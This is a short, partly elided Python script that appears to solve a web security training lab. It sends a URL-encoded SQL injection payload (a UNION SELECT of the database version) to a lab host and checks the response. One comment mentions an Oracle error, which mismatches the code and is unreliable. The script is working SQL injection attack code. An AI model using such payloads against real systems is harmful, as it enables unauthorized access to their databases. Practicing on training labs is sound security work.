...
def exploit_sqli(url, payload, proxies):
    try:
        ...
        response = requests.get(url + uri + encoded_payload, verify=False, proxies=proxies)

        # Check for Oracle Database error in the response text
        if "ubuntu" in response.text:
            return True
        else:
            return False
...
if __name__ == "__main__":
    try:
        ...
        print(f"[-] Example: {sys.argv[0]} https://0a72000b03fc80ea8bc0de2b003c00ca.web-security-academy.net \"'UNION SELECT @@version,NULL#\"")
        sys.exit(-1)
